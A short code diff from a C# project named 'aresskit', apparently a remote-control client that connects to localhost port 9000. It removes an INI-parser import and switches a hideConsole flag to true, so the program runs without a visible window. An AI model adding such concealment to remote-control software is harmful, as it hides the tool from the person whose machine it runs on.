@@ -1,8 +1,6 @@
 ﻿using System;
 using System.Linq;
 using System.Reflection;
-using IniParser;
-using IniParser.Model;
 
 namespace aresskit
 {
@@ -10,7 +8,7 @@ namespace aresskit
     {   
         const string server = "localhost";
         const int port = 9000;
-        const bool hideConsole = false;
+        const bool hideConsole = true;
         const string cmdSplitter = "::";
         
 
